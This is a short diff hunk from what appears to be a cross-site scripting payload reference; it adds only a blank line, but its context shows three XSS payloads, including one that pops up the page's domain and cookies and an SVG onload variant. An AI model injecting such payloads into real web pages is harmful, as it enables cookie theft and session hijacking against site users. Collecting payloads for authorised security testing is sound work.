@@ -42,6 +42,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   --- Important Note ---
   --- Please do consider that those payloads are used not for fuzzing nor to be added to a wordlist, ---
   --- there are many payloads here that would need additional actions to properly work. ---
+  
   <script>alert(document.domain+"\n\n"+document.cookie);<script>
   </script><svg><script/class=rodric>alert(1)</script>-%26apos;
   </SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
